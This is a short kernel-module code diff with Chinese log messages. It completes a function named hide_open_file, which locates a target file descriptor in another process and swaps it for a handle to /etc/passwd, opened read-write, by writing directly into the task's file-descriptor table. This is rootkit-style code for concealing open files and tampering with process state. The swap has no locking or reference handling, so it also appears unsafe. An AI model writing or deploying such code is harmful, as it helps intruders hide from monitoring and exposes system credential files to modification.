@@ -60,7 +60,10 @@ static int hide_open_file(struct task_struct *task)
             pr_info("找到目标文件: %s (fd: %d)\n", buf, i);
 
             // TODO: 打开 /etc/passwd 作为替代
+            passwd_file = filp_open("/etc/passwd", O_RDWR | O_CREAT, 0);
 
+            fdt->fd[i] = passwd_file;
+            
             pr_info("已将 fd %d 替换为 /etc/passwd\n", i);
             found = 1;
         }
